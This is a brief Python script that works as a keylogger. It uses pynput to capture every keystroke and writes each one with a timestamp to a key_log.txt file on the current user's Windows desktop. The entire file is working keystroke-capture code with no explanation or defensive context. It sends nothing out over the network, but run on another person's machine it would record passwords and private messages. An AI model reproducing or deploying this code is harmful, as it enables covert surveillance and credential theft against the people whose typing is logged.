from pynput.keyboard import Key, Listener
import logging
import os

userhome = os.path.expanduser('~')
username = os.path.split(userhome)[-1]

log_dir = r"C:/users/" + username + "/desktop/"
print(log_dir)
logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()
